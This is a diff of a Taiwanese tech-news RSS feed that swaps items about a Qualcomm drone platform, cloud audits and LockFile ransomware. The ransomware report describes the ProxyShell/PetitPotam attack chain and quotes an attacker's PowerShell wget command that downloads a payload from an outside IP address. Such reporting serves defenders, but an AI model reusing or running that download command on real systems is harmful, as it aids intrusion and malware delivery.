+&lt;p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;&lt;strong&gt;高通發表新一代5G AI無人機平臺&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;高通推出全球第一個5G AI無人機平臺Flight RB5 5G，可用來加速各種無人機應用的開發。該平臺具備第5代高通AI引擎，可處理複雜的電腦視覺、感知和自主性功能等任務，比如多目標偵測和追蹤、數位雲臺和立體視野深度，以及路徑規畫、障礙物迴避等功能。&lt;/p&gt;
+&lt;p&gt;另一方面，平臺還具8個QRB5165中央處理器、1個GPU和1個神經處理引擎，還有能捕捉4K和8K解析度影片的攝影鏡頭，可提供電子影像穩定器、水平功能和數位變焦等功能，拍攝出電影品質的影像。而5G和Wi-Fi 6連接能力，能實現長達8公里的可視距離飛行。高通Flight RB5 5G無人機參照設計現在於無人機製造商ModalAI上預售，而開發套件則預計在今年第4季上市。&lt;a href=&quot;https://www.qualcomm.com/news/onq/2021/08/17/qualcomm-flight-rb5-5g-platform-worlds-first-5g-and-ai-enabled-drone-platform&quot;&gt;（詳全文）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://www.qualcomm.com/sites/ember/files/styles/optimize/public/blog/managed-images/qc_onq_flightrb5platform_inline-image.png?itok=8tvgKr4j&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;圖片來源／Amazon、Uber、IBM、微軟、高通&lt;/p&gt;
+&lt;p&gt;&lt;span style=&quot;color:#FFFFFF;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;background-color:#3399ff;&quot;&gt; AI趨勢近期新聞 &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;1. 馬斯克描繪特斯拉人形機器人Tesla Bot，預計明年推出原型機&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. SAP併購AI人力資源平臺SwoopTalent&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;3. 史丹佛大學200頁報告詳解超大預訓練模型的優劣和風險&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;資料來源：iThome整理，2021年8月&lt;/p&gt;
+&lt;div id=&quot;gtx-trans&quot; style=&quot;position: absolute; left: 1206px; top: 226.203px;&quot;&gt;
+&lt;div class=&quot;gtx-trans-icon&quot;&gt; &lt;/div&gt;
+&lt;/div&gt;
+ &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Thu, 26 Aug 2021 10:21:33 +0000</pubDate>
  <dc:creator>王若樸</dc:creator>
- <guid isPermaLink="false">146306 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/people/146306#comments</comments>
+ <guid isPermaLink="false">146407 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146407#comments</comments>
 </item>
 <item>
- <title>2021年8月10大資安新聞</title>
- <link>https://www.ithome.com.tw/news/146389</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;整個8月出現了相當多重大的資安事故，以及許多影響範圍甚廣的漏洞。值得留意的是不少與物聯網（IoT）設備有關。像是臺灣綜合接入設備（IAD）製造商智易科技（Arcadyan）所生產的路由器，當中曝露的漏洞，不只影響華碩、Buffalo等品牌的多款產品，更是波及許多網路服務供應商（ISP）的設備，漏洞可能影響數百萬臺設備。而瑞昱半導體（Realtek）無線晶片的漏洞，也使得超過200款連網產品受到影響。而物聯網雲端服務平臺Kalay&lt;a href=&quot;https://www.ithome.com.tw/news/146258&quot;&gt;傳出CVSS風險達9.6分的漏洞&lt;/a&gt;，很可能使得採用該平臺的連網設備曝露相關風險。&lt;/p&gt;
-&lt;p&gt;針對連網裝置的攻擊，還有鎖定網路儲存裝置（NAS）而來的事故。先是群暉科技（Synology）發出警告，指出他們&lt;a href=&quot;https://www.ithome.com.tw/news/146131&quot;&gt;偵測到一波殭屍網路病毒StealthWorker攻擊行動&lt;/a&gt;；事隔數日，資安業者Palo Alto Networks揭露勒索軟體eCh0raix（亦被稱為QNAPCrypt）的威力變得更加強大，&lt;a href=&quot;https://www.ithome.com.tw/news/146141&quot;&gt;能同時針對群暉科技與威聯通科技（QNAP）的NAS下手&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;而駭客攻擊連網裝置的目的，很有可能是為了接續能針對企業內部發動進一步的攻擊。例如，&lt;a href=&quot;https://www.ithome.com.tw/news/146349&quot;&gt;殭屍網路病毒Mozi鎖定Netgear、華為、中興（ZTE）等廠牌的網路閘道設備&lt;/a&gt;，並具備持續常駐於受害裝置的能力，攻擊者成功控制這種網路閘道設備後，有可能接下來會藉此傳遞漏洞滲透工具，或者是發動勒索軟體攻擊。&lt;/p&gt;
-&lt;p&gt;論及勒索軟體攻擊的部分，國內有技嘉疑似遭RansomEXX攻擊的事故，以及&lt;a href=&quot;https://www.ithome.com.tw/news/146292&quot;&gt;連鎖餐飲業者鬍鬚張因勒索軟體攻擊而導致客戶資料外洩&lt;/a&gt;的情形。而在國外，則有LockBit 2.0這個新興的勒索軟體，不只攻擊IT顧問公司Accenture，&lt;a href=&quot;https://www.ithome.com.tw/news/146226&quot;&gt;7月在澳洲也出現大量受害組織&lt;/a&gt;。但在這些重大事故之外，我們可以看到有一些過往鮮少、甚至是幾乎沒有出現過的勒索軟體攻擊手法，例如，駭客透過LinkedIn找尋內應，以高額分紅希望員工能在公司的重要Windows伺服器執行勒索軟體，也有攻擊者發起結合客服的BazaCall釣魚郵件攻擊，&lt;a href=&quot;https://www.ithome.com.tw/news/146037&quot;&gt;目的是要在受害者所屬的組織植入Ryuk或Conti勒索軟體&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;而在企業的IT環境裡，繼上個月Windows列印多工緩衝處理器（Print Spooler）被發現數個PrintNightmare漏洞，本月份則有影響AD網域的PetitPotam漏洞，以及由戴夫寇爾（Devcore）研究員揭露的Exchange漏洞ProxyShell，都相當值得留意後續的發展。&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;01.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146091&quot;&gt;近40款智易路由器存在身分驗證漏洞，恐影響數百萬臺設備&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-01.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;02.&lt;/span&gt;&lt;/strong&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146236&quot;&gt;&lt;strong style=&quot;vertical-align: top;&quot;&gt;瑞昱無線晶片重大漏洞恐波及逾200款連網設備&lt;/strong&gt;&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-02.jpg&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;03.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146339&quot;&gt;殭屍網路發動大規模DDoS攻擊，每秒發出逾1,700萬次HTTP請求&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-03.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;04.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/145919&quot;&gt;Windows Server用戶小心！PetitPotam漏洞恐讓攻擊者挾持AD網域&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-04.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;05.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146039&quot;&gt;戴夫寇爾研究員因揭露ProxyShell等多項Exchange漏洞，獲Pwnie Awards最佳伺服器漏洞獎&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-05.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;06.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146069&quot;&gt;滲透測試工具Cobalt Strike存在DoS漏洞，可以用來遏阻攻擊行動&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-06.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;07.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146295&quot;&gt;駭客以百萬美元贖金分紅利誘員工，意圖在企業內部植入勒索軟體&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-07.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;08.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146075&quot;&gt;技嘉科技傳出遭勒索軟體攻擊&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-08.jpg&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;9.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146157&quot;&gt;勒索軟體LockBit攻擊IT顧問公司Accenture，要脅限期支付贖金&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-09.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
-&lt;h2&gt;&lt;strong&gt;&lt;span style=&quot;color: rgb(178, 34, 34);&quot;&gt;10.&lt;/span&gt;&lt;a href=&quot;https://www.ithome.com.tw/news/146310&quot;&gt;日本加密貨幣交易所Liquid驚傳遭駭，駭客偷走近上億美元加密貨幣&lt;/a&gt;&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/2021-08-10.png&quot; style=&quot;width: 400px; height: 175px;&quot; /&gt;&lt;/p&gt;
+ <title>勒索軟體LockFile濫用PetitPotam漏洞，掌控AD網域伺服器</title>
+ <link>https://www.ithome.com.tw/news/146406</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;新的勒索軟體攻擊大肆濫用近期公開的重大漏洞，而使得企業與組織難以招架。例如，&lt;a href=&quot;https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockfile-ransomware-new-petitpotam-windows&quot;&gt;賽門鐵克揭露一起名為LockFile勒索軟體的攻擊行動&lt;/a&gt;，其中攻擊者先是經由Exchange郵件伺服器，入侵企業內部網路環境，接下來再藉著&lt;a href=&quot;https://www.ithome.com.tw/news/145919&quot;&gt;PetitPotam漏洞（CVE-2021-36942）&lt;/a&gt;，控制AD網域伺服器，並感染內網的電腦。&lt;/p&gt;
+&lt;p&gt;這起攻擊行動賽門鐵克最早在7月20日發現，受害者是美國的金融組織，而該公司看到最新的攻擊出現於8月20日，至少有10個組織遭到LockFile攻擊，受害組織遍及全世界，但多數位於美國及亞洲。&lt;/p&gt;
+&lt;p&gt;對於LockFile受害組織的類型，包括製造業、金融服務、工程公司、法務公司、商業服務，以及旅遊業等。&lt;/p&gt;
+&lt;p&gt;至於攻擊者的身分為何？賽門鐵克指出，根據駭客留下來的勒索訊息中，提供受害者聯繫的電子郵件信箱&lt;a href=&quot;mailto:contact@contipauper&quot;&gt;contact@contipauper&lt;/a&gt;[.]com，可能是與Conti相關的駭客組織所為。而這個勒索訊息的畫面，也與日前&lt;a href=&quot;https://www.ithome.com.tw/news/146157&quot;&gt;攻擊大型IT顧問公司Accenture的LockBit&lt;/a&gt;極為相似，但這兩個勒索軟體之間是否有所關連？賽門鐵克沒有進一步說明。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://s4.itho.me/sites/default/files/images/Figure 1_0-s.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/Figure%201_0-s.png&quot; style=&quot;width: 580px; height: 232px;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;攻擊者先占據Exchange伺服器，再藉由AD網域伺服器「派送」勒索軟體&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;針對於LockFile攻擊的過程，賽門鐵克提出進一步的說明。攻擊者先是入侵Exchange郵件伺服器，並下達PowerShell命令，試圖使用Wget程式下載檔案，但究竟攻擊者下載了什麼？賽門鐵克表示不得而知，僅表示在發動勒索軟體攻擊之前，駭客會維持存取受害組織的網路數日。&lt;/p&gt;
+&lt;p&gt;直到即將植入勒索軟體的前20至30分鐘，攻擊者會在上述遭到入侵的Exchange郵件伺服器上，開始部署一組工具，分別是efspotato.exe、active_desktop_render.dll，以及active_desktop_launcher.exe等3個檔案。&lt;/p&gt;
+&lt;p&gt;其中，efspotato.exe是PetitPotam漏洞的濫用工具，疑似來自GitHub上的概念性驗證（PoC）工具；而active_desktop_launcher.exe是合法應用程式，它是中國酷狗音樂所推出的動態桌面軟體（KuGou Active Desktop），攻擊者將它用來側載惡意程式庫active_desktop_render.dll。&lt;/p&gt;
+&lt;p&gt;這個惡意DLL一旦被成功載入，就會企圖解密伺服器本機上一個名為desktop.ini的檔案。如果這個INI檔案成功解密，將會執行Shellcode。賽門鐵克表示，目前他們尚未取得這個desktop.ini進行分析，而無法進一步說明過程中執行了那些行為。&lt;/p&gt;
+&lt;p&gt;而賽門鐵克推測，這個加密Shellcode的用途，應該就是啟動efspotato.exe，濫用PetitPotam漏洞攻擊AD網域伺服器。該公司強調，雖然&lt;a href=&quot;https://www.ithome.com.tw/news/146154&quot;&gt;微軟已於8月的例行修補（Patch Tuesday）提供修補程式&lt;/a&gt;，但隨後有資安研究人員指出，修補程式並未完全修補這項漏洞，&lt;a href=&quot;https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1&quot;&gt;而能夠在已經安裝修補程式的Windows伺服器上重現&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;一旦成功存取AD網域伺服器，攻擊者就會在網域伺服器的指定資料夾（sysvol\domain\scripts）中，「部署」LockFile勒索軟體相關檔案，而上述提及的資料夾路徑，就是所有的網路使用者向網域控制器執行身分驗證時，用來部署指令碼（Script）的資料夾。換言之，只要電腦使用者登入網域，電腦就會複製LockFile的檔案並且執行，將電腦的檔案加密。&lt;/p&gt;
+&lt;h2&gt;&lt;strong&gt;攻擊者入侵的管道竟是運用甫被揭露的Exchange重大漏洞ProxyShell&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;揭露此事的賽門鐵克表明，本次攻擊行動仍有多處細節仍不明朗，尤其是攻擊者入侵Exchange伺服器的手法，仍有待調查。不過，有資安研究人員根據蜜罐（Honeypot）所收集的情報，指出LockFile攻擊者就是利用ProxyShell漏洞來下手。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://doublepulsar.com/multiple-threat-actors-including-a-ransomware-gang-exploiting-exchange-proxyshell-vulnerabilities-c457b1655e9c&quot;&gt;資安研究人員Kevin Beaumont於8月21日指出&lt;/a&gt;，他的蜜罐在8月13日，偵測到濫用ProxyShell漏洞的攻擊行動，駭客試圖在蜜罐植入Webshell，而且，多數防毒軟體無法識別這個Webshell檔案有害。這個攻擊引起Kevin Beaumont注意的原因，就是攻擊來源IP位址與賽門鐵克揭露的一致。&lt;/p&gt;
+&lt;p&gt;事隔3日，Kevin Beaumont看到駭客再度入侵蜜罐，並且下達新的攻擊命令與植入LockFile檔案。也就是說，攻擊者最初入侵Exchange伺服器的手段，就是濫用ProxyShell漏洞。&lt;/p&gt;
+&lt;blockquote class=&quot;twitter-tweet&quot;&gt;&lt;p dir=&quot;ltr&quot; lang=&quot;en&quot; xml:lang=&quot;en&quot;&gt;Another ProxyShell attack, actions on target:&lt;/p&gt;
+&lt;p&gt;&quot;C:\Windows\System32\cmd.exe&quot; /c powershell wget &lt;a href=&quot;http://209.14.0.234:55676/P0BV1KrEwh8Xgeo6ctNq&quot;&gt;http://209.14.0.234:55676/P0BV1KrEwh8Xgeo6ctNq&lt;/a&gt; &lt;a href=&quot;https://t.co/5YxPBYPt9F&quot;&gt;https://t.co/5YxPBYPt9F&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;— Kevin Beaumont (@GossiTheDog) &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1427225282713427968?ref_src=twsrc%5Etfw&quot;&gt;August 16, 2021&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
+&lt;script async=&quot;&quot; src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;&lt;p&gt;針對這項發現，Kevin Beaumont指出，雖然這組漏洞微軟已於4月發布修補程式，但相較於另一組在3月修補的重大漏洞ProxyLogon，他認為攻擊者濫用ProxyShell的門檻較低，而且大型組織很可能還沒有安裝修補程式，而導致攻擊者能輕易入侵Exchange伺服器。而ProxyShell已被駭客大肆濫用的現象，也使得&lt;a href=&quot;https://www.ithome.com.tw/news/146353&quot;&gt;美國網路安全及基礎設施安全局（CISA）提出呼籲&lt;/a&gt;，企業應儘速修補Exchange伺服器。&lt;/p&gt;
+&lt;p&gt;對於LockFile勒索軟體攻擊濫用ProxyShell漏洞的行為，也有另一家資安業者TG Soft揭露他們的看法，並&lt;a href=&quot;https://twitter.com/VirITeXplorer/status/1428750497872232459&quot;&gt;公布了攻擊流程圖&lt;/a&gt;，指出攻擊者在使用了efspotato.exe之後，使用了&lt;a href=&quot;https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/#ransomware-payloads&quot;&gt;Vatet Loader&lt;/a&gt;來載入滲透測試工具Cobalt Strike，進而更動群組原則來散布勒索軟體LockFile。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://s4.itho.me/sites/default/files/images/E9Pv92oXIAwh2oC-s.png&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://s4.itho.me/sites/default/files/images/E9Pv92oXIAwh2oC-s.png&quot; style=&quot;width: 580px; height: 177px;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 15:23:14 +0000</pubDate>
+ <pubDate>Thu, 26 Aug 2021 09:50:54 +0000</pubDate>
  <dc:creator>周峻佑</dc:creator>
- <guid isPermaLink="false">146389 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146389#comments</comments>
+ <guid isPermaLink="false">146406 at https://www.ithome.com.tw</guid>
+ <comments>https://www.ithome.com.tw/news/146406#comments</comments>
 </item>
 <item>
- <title>Nvidia推AI Enterprise平臺可在混合雲環境執行虛擬化AI工作負載</title>
- <link>https://www.ithome.com.tw/news/146387</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;Nvidia與VMware在長達一年的合作之後，終於發布了一套人工智慧工具和框架軟體套件&lt;a href=&quot;https://nvidianews.nvidia.com/news/global-availability-of-nvidia-ai-enterprise-makes-ai-accessible-for-every-industry&quot; target=&quot;_blank&quot;&gt;Nvidia AI Enterprise&lt;/a&gt;，Nvidia AI Enterprise能夠虛擬化人工智慧工作負載，在經Nvidia認證的伺服器系統上運作，可讓用戶以管理傳統應用程式的方式，管理新興人工智慧工作負載。&lt;/p&gt;
-&lt;p&gt;Nvidia AI Enterprise是一個端到端雲端原生的人工智慧和資料分析軟體套件，能夠虛擬化人工智慧工作負載，使其在VMware vSphere上運作，該工具賦予企業在混合雲環境中，快速部署、管理和擴展人工智慧工作負載的能力。&lt;/p&gt;
-&lt;p&gt;該公司提到，Nvidia AI Enterprise供企業開發新型人工智慧應用，並可透過單一平臺進行管理，而且企業還能夠根據資料的位置，無論是在雲端、本地資料中心還是邊緣網路，就近部署人工智慧工作負載。&lt;/p&gt;
-&lt;p&gt;由於Nvidia AI Enterprise使用VMware vSphere，因此讓IT人員能夠以管理傳統企業應用程式相同的方式，輕鬆管理人工智慧工作負載，還能使用大型資料庫和混合雲環境中的工具。目前Atos、戴爾、Gigabyte和超微等公司，都可提供經Nvidia認證，包括A100、A30和A40等GPU系統選擇，使得人工智慧應用程式在vSphere上執行的效能，能和裸機伺服器不相上下。&lt;/p&gt;
-&lt;p&gt;用戶現在可從Nvidia的合作夥伴訂閱Nvidia AI Enterprise，一年訂閱費用每個CPU插槽2,000美元起，永久授權為3,595美元，可加購額外的支援服務。&lt;/p&gt;
+ <title>金管會完成第一家公雲虛擬稽核，Google臺灣資料中心是第一家</title>
+ <link>https://www.ithome.com.tw/news/146405</link>
+ <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;Google雲端臺灣總經理謝良承今日（8/26）在國泰金控技術年會一場座談中透露，Google雲端臺灣資料中心已在今年初完成金管會第一次的虛擬稽核了，成為第一家在臺灣完成政府機關稽核的公有雲業者。&lt;/p&gt;
+&lt;p&gt;這項藏在謝良承回覆對談提問的資訊，可說是臺灣企業朝雲端發展的一項重磅消息，特別是對須遵循嚴謹資料保護法規的金融業和醫療業的企業。因為，這代表Google雲端資料中心不只符合國際規範，現也符合了臺灣法規的規範。&lt;/p&gt;
+&lt;p&gt;金管會於2019年時已宣布開放金融業者上雲，因視銀行上雲為委外作業，所以，在監督、稽核、緊急應變等面向皆對金融機構有所要求和規範，使得金融業在上雲之路上，仍然面對不少挑戰，特別是須確保監管機關可查核雲端業者。&lt;/p&gt;
+&lt;p&gt;如今，謝良承在出席座談活動表示：「Google Cloud是唯一一家（公有雲業者）透過政府，今年年初完成臺灣資料中心的第一次虛擬稽核。」經由記者進一步與Google臺灣確認，獲知Google雲端是透過金管會認可的獨立第三方稽核單位，完成對Google雲端臺灣資料中心的虛擬稽核作業。&lt;/p&gt;
+&lt;p&gt;Google領先其他公有雲業者，成為首家在臺完成政府稽核的業者，勢必會加快其他業者完成稽核的速度，有機會帶動新一波企業上雲的浪潮。&lt;/p&gt;
+&lt;p&gt;且除了金管會已開放銀行上雲，身為醫療院所監管單位的衛福部也正在準備開放電子病歷上雲。衛福部資訊處處長龐一鳴於今年5月宣布，衛福部已整合電子病歷上雲託管草案的內部意見，會公開草案以徵詢外部意見。金管會搶先落實的上雲委外作法，也可能成為醫療業上雲規範的參考。&lt;/p&gt;
+&lt;p&gt;不過，現階段Google是三大公有雲業者中，唯一在臺有資料中心已投入運轉的業者。2013年時，Google啟用位在彰化彰濱工業區的旗下臺灣首座資料中心，目前已擴建到第四期，之後，又分別在2019年時，宣布在臺南科技工業園區內，興建在臺第二座資料中心，以及在2020年時，對外證實已在雲林斗六購買6萬坪土地，確定會建立在臺第三座資料中心。總計Google在臺共有三座機房的營運計畫。&lt;/p&gt;
+&lt;p&gt;而身為公有雲第二大業者的微軟，則是在去年10月時宣布，將在臺灣建立Azure區域級雲端資料中心。目前有消息傳出，微軟將在今年底或是明年初啟用臺灣資料中心。&lt;/p&gt;
+&lt;p&gt;三大公有雲業者中僅剩下龍頭AWS，至今尚未發布任何資料中心落地臺灣的興建計畫。相關的消息仍停留在，2017年時，AWS臺灣辦公室送交在臺設立資料中心的第二輪評估報告，給美國總部做進一步的評估。文⊙黃郁芸&lt;/p&gt;
  &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 12:57:14 +0000</pubDate>
- <dc:creator>李建興</dc:creator>
- <guid isPermaLink="false">146387 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146387#comments</comments>
-</item>
-<item>
- <title>Npm註冊表將棄用TLS 1.0和TLS 1.1</title>
- <link>https://www.ithome.com.tw/news/146381</link>
- <description>&lt;div class=&quot;field field-name-field-news-column-category field-type-taxonomy-term-reference field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/tags/%E6%96%B0%E8%81%9E&quot;&gt;新聞&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://github.blog/2021-08-23-npm-registry-deprecating-tls-1-0-tls-1-1/&quot;&gt;GitHub宣布&lt;/a&gt;從2021年10月4日開始，所有和Npm網站和註冊表的連接，包括軟體套件安裝，都必須要使用TLS 1.2以上的版本。GitHub考量服務安全性和隱私性，已經在去年的時候，取消GitHub服務對TLS 1.0和TLS 1.1的支援，而現在輪到Npm，棄用公共Npm註冊表npmjs.com的非HTTPS存取，以及TLS 1.0和TLS 1.1。&lt;/p&gt;
-&lt;p&gt;官方提到，目前Npm註冊表99％的流量都已經使用TLS 1.2，因此他們預計大多數用戶不會受到棄用影響。在0.10版本之後釋出的Node.js二元檔案，都支援TLS 1.2，所以使用最近Node.js和Npm版本的用戶，都不需要進行任何的修改。&lt;/p&gt;
-&lt;p&gt;Npm會從2021年10月4日開始，強制執行最低TLS 1.2限制，在之前官方會採取措施提醒可能受影響的用戶，從8月24日開始，未使用TLS 1.2的用戶，在執行Npm命令的時候，會接受到通知，並且提供棄用公告連結。9月22日便會強制限用TLS 1.2一個小時，到了9月27日便會在當天執行兩次的限用，在9月29日的第三次限用，時間將會長達6小時。&lt;/p&gt;
-&lt;p&gt;用戶可以試著停用TLS 1.0和TLS 1.1，並且從HTTPS端點測試安裝套件，當用戶看到TLS錯誤訊息，便可以升級到當前支援的Node.js版本和使用最新的Npm v7，避免受到棄用影響。&lt;/p&gt;
- &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
- <pubDate>Wed, 25 Aug 2021 12:54:20 +0000</pubDate>
- <dc:creator>李建興</dc:creator>
- <guid isPermaLink="false">146381 at https://www.ithome.com.tw</guid>
- <comments>https://www.ithome.com.tw/news/146381#comments</comments>
-</item>
-<item>
- <title>Yahoo奇摩打通旗下3大電商平臺App互導流量，拍賣平臺還將導入跨網比價功能</title>
- <link>https://www.ithome.com.tw/news/146388</link>
